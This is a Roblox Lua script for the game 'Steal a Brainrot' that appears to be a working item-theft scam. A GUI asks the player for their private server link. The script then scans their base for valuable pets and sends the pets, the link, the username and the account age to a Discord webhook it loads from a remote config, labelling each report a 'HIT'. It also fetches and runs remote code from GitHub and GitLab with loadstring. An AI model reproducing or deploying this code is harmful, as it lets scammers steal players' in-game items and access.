-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer

-- Load config from GitHub
local config = {}
do
    local ok, res = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
    end)
    if ok and type(res) == "table" then
        config = res
    else
        config = {
            WEBHOOK = "",
            targetNames = {},
            Receiver = {}
        }
    end
end

local WEBHOOK = config.WEBHOOK
local targetNames = config.targetNames or {}
local receiverList = table.concat(config.Receiver or {}, ", ")

-- Load Brainrot emoji table from GitLab
local success, Brainrots = pcall(function()
    return loadstring(game:HttpGet("https://gitlab.com/nolag-idp-group/emojisforstlr/-/raw/main/stlr"))()
end)
if not success or type(Brainrots) ~= "table" then
    warn("Failed to load Brainrot emoji table!")
    Brainrots = {}
end

-- Normalize Brainrot names for matching
local function normalizeName(name)
    return (name:gsub("%s+", " "):gsub("^%s*(.-)%s*$", "%1"):lower())
end

-- Function to detect executor
local function detectExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif fluxus then return "Fluxus"
    elseif secure_load then return "Sentinel"
    elseif getexecutorname then return getexecutorname()
    elseif identifyexecutor then return identifyexecutor()
    else return "Unknown" end
end

local function getAccountAge()
    return player and player.AccountAge or 0
end

-- Scan player's base for Brainrots
local function scanMyBase()
    local pets = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return pets end

    for _, plot in pairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
            local seen = {}

            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, podium in pairs(podiums:GetChildren()) do
                    if podium:IsA("Model") then
                        local floor = "? Floor"
                        local num = tonumber(podium.Name:match("^(%d+)_?"))
                        if num then
                            if num>=1 and num<=10 then floor="1st Floor"
                            elseif num<=18 then floor="2nd Floor"
                            else floor="3rd Floor" end
                        end

                        local base = podium:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        if spawn and spawn:FindFirstChild("Attachment") then
                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
                            if overhead then
                                local nameLabel = overhead:FindFirstChild("DisplayName")
                                local genLabel = overhead:FindFirstChild("Generation")
                                if nameLabel and genLabel then
                                    local nameText = nameLabel.Text
                                    local genText = genLabel.Text
                                    local uniqueKey = nameText.."_"..floor.."_"..genText
                                    if not seen[uniqueKey] then
                                        table.insert(pets, {name=nameText, value=genText, floor=floor})
                                        seen[uniqueKey] = true
                                    end
                                end
                            end
                        end
                    end
                end
            end
            break -- only scan own plot
        end
    end
    return pets
end

-- Send webhook
local function sendWebhook(pets, privateServerLink)
    if not pets or #pets == 0 then return end
    if player and player:GetAttribute("WebhookSent") then return end

    local lines = {}
    local shouldPing = false
    local highValueThreshold = 7.5e6

    for _, pet in ipairs(pets) do
        local normalized = normalizeName(pet.name)
        local emoji = Brainrots[normalized] or "ðŸ§ "
        local valueNum = tonumber(pet.value:match("[%d%.]+")) or 0
        if pet.value:find("K") then valueNum = valueNum*1e3
        elseif pet.value:find("M") then valueNum = valueNum*1e6
        elseif pet.value:find("B") then valueNum = valueNum*1e9 end

        if valueNum >= highValueThreshold then shouldPing = true end
        table.insert(lines, string.format("%s %s â†’ %s â†’ %s", emoji, pet.name, pet.value, pet.floor))
    end

    local lootText = table.concat(lines, "\n")
    local playerInfoText = "```"..
        "Name: "..(player and player.Name or "Unknown").."\n"..
        "Receiver: "..receiverList.."\n"..
        "Executor: "..detectExecutor().."\n"..
        "Account Age: "..tostring(getAccountAge()).." days```"

    local embed = {
        ["title"] = "ðŸ§  Steal a Brainrot HIT! - bloomscripts ðŸ§ ",
        ["color"] = 12413107,
        ["fields"] = {
            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
            {["name"]="ðŸ‘¥ Player Info", ["value"]=playerInfoText},
            {["name"]="ðŸŽ’ Brainrots in Base", ["value"]="```"..lootText.."```"},
            {["name"]="Join Server Link", ["value"]=privateServerLink or "No link entered"}
        }
    }

    local payload = {
        ["content"] = shouldPing and "@everyone ðŸ”¥ **High Value Brainrot Detected!** ðŸ”¥" or "",
        ["embeds"] = {embed},
        ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
    }

    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if req and WEBHOOK and WEBHOOK ~= "" then
        pcall(function()
            req({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
        if player then
            player:SetAttribute("WebhookSent", true)
        end
    end
end

-- ================= GUI for private server link =================
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "StealBrainrotGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, -160, 0.5, -90)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Text = "Steal a Brainrot"
title.Font = Enum.Font.FredokaOne
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 4)

local closeButton = Instance.new("TextButton", frame)
closeButton.Text = "X"
closeButton.Font = Enum.Font.FredokaOne
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
closeButton.Size = UDim2.new(0, 28, 0, 28)
closeButton.Position = UDim2.new(1, -34, 0, 4)
Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)

local textBox = Instance.new("TextBox", frame)
textBox.Size = UDim2.new(0.9, 0, 0, 36)
textBox.Position = UDim2.new(0.05, 0, 0, 50)
textBox.PlaceholderText = "Enter your private server link"
textBox.Text = ""
textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.ClearTextOnFocus = false
textBox.Font = Enum.Font.FredokaOne
textBox.TextSize = 14
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)

local statusLabel = Instance.new("TextLabel", frame)
statusLabel.Size = UDim2.new(0.9, 0, 0, 24)
statusLabel.Position = UDim2.new(0.05, 0, 0, 90)
statusLabel.Text = ""
statusLabel.Font = Enum.Font.FredokaOne
statusLabel.TextSize = 14
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.BackgroundTransparency = 1

local sendButton = Instance.new("TextButton", frame)
sendButton.Text = "Send"
sendButton.Font = Enum.Font.FredokaOne
sendButton.TextSize = 18
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
sendButton.Size = UDim2.new(0.4, 0, 0, 32)
sendButton.Position = UDim2.new(0.3, 0, 0, 120)
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)

local function isValidPrivateServerLink(txt)
    return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
end

textBox:GetPropertyChangedSignal("Text"):Connect(function()
    if isValidPrivateServerLink(textBox.Text) then
        statusLabel.Text = "Valid âœ…"
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        statusLabel.Text = "Invalid âŒ"
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

local function handleSend()
    local txt = textBox.Text or ""
    if isValidPrivateServerLink(txt) then
        screenGui:Destroy()
        task.spawn(function()
            local pets = scanMyBase()
            if #pets > 0 then
                sendWebhook(pets, txt)
            end
            task.wait(1)
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/testforlib/refs/heads/main/loading"))()
            end)
        end)
    else
        warn("Invalid private server link!")
    end
end

sendButton.MouseButton1Click:Connect(handleSend)
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then handleSend() end
end)
test
